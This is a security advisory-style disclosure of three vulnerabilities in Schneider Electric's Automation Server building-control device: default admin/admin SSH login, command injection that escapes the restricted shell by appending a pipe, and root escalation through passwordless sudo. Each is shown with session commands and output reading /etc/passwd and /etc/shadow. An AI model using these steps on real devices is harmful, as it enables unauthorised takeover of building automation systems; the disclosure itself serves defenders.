*# Exploit Title: [*Schneider Electric SBO / AS Multiple Vulnerabilities]
# Discovered by: Karn Ganeshen
# Vendor Homepage: [www.schneider-electric.com*] *
*# Versions Reported: [*
Automation Server Series (AS, AS-P), v1.7 and prior
*] *
# CVE-ID: [CVE-2016-2278]

About
Schneider Electric’s corporate headquarters is located in Paris, France,
and it maintains offices in more than 100 countries worldwide.

The affected product, Automation Server, is a building automation system
for small and medium-sized buildings. According to Schneider Electric,
Automation Server is deployed in the Commercial Facilities sector.
Schneider Electric estimates that this product is used worldwide.

*Vulnerabilities*
*1. Weak credential management*
CVE-ID: None [ Mitre, CVE? ]

There are two primary users:
a. root - password is not set by default - this is a problem as we will see
later in the vuln findings
- By default, root cannot SSH in.
b. admin - default password is 'admin'
- Anyone can remotely ssh in to the device using default admin/admin login.

The system / application allows a) weak creds to start with, and more
importantly, b) vulnerable versions lacks the mechanism to forcefully have
the user change the initial password on first use or later. This has been
fixed in the latest version.

*2. OS Command Injection*
*CVE-ID*: CVE-2016-2278
*https://ics-cert.us-cert.gov/advisories/ICSA-16-061-01
<https://ics-cert.us-cert.gov/advisories/ICSA-16-061-01>*

After logging in to the device over SSH, the 'admin' user - the only
active, administrative user at this point - is provided a restricted shell
(msh), which offers a small set of, application- specific functional
options.

$ ssh <IP> -l admin
Password:

Welcome! (use 'help' to list commands)
admin@box:>

admin@box:> *release*
NAME=SE2Linux
ID=se2linux
PRETTY_NAME=SE2Linux (Schneider Electric Embedded Linux)
VERSION_ID=0.2.0.212

admin@box:>

admin@box:> help
usage: help [command]
Type 'help [command]' for help on a specific command.

Available commands:
exit - exit this session
ps - report a snapshot of the current processes readlog - read log files
reboot - reboot the system
setip - configure the network interface
setlog - configure the logging
setsnmp - configure the snmp service
setsecurity - configure the security
settime - configure the system time
top - display Linux tasks
uptime - tell how long the system has been running release - tell the os
release details

Attempting to run any different command will give an error message.

However, this restricted shell functionality (msh) can be bypassed to
execute underlying system commands, by appending '| <command>' to any of
the above set of commands:

admin@box:> *uptime | ls*
bin home lost+found root sys config include mnt run tmp dev lib opt sbin usr
etc localization proc share var

At this point, basically you have full (indirect) control over the server.

admin@box:> *uptime | cat /etc/passwd *

root:x:0:0:root:/:/bin/sh
daemon:x:2:2:daemon:/sbin:/bin/false
messagebus:x:3:3:messagebus:/sbin:/bin/false
ntp:x:102:102:ntp:/var/empty/ntp:/bin/false
sshd:x:103:103:sshd:/var/empty:/bin/false
app:x:500:500:Linux Application:/:/bin/false
admin:x:1000:1000:Linux User,,,:/:/bin/msh

admin@box:> uptime | cat /etc/group
root:x:0:
wheel:x:1:admin
daemon:x:2:
messagebus:x:3:
adm:x:5:admin
power:x:20:app
serial:x:21:app
cio:x:22:app
lon:x:23:app
daemonsv:x:30:admin,app
utmp:x:100:
lock:x:101:
ntp:x:102:
sshd:x:103:
app:x:500:admin
admin:x:1000:admin

*3. Privilege Escalation / access to superuser 'root'*
CVE-ID: None [ Mitre, CVE? ]

Since this is an administrative user, an attacker can exploit OS command
injection to perform a variety of tasks from msh shell. But isn’t it better
to get a root shell instead.!

As observed from Issue 1 above, root does not have a password set, and it
is possible to use 'sudo -i' and become root.

*Note*: sudo is not presented / offered to 'admin' in the set of functional
options available thru msh. It is required for tech guys / legit admins /
SBO admins to manage the AS system and related functionality. Assumption
from SE team is, a low-skilled attacker / regular, unsophisticated,
non-technical user will not be able to figure it out. If someone does
figure it out, he/she will be responsible enough not to go evill.!

admin@box:> *sudo -i*

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

#1) Respect the privacy of others.
#2) Think before you type.
#3) With great power comes great responsibility.

Password:

root@box:~> cat /etc/shadow
root:!:16650:0:99999:7:::
sshd:!:1:0:99999:7:::
admin:$6$<hash>:16652:0:99999:7:::

+++++
-- 
Best Regards,
Karn Ganeshen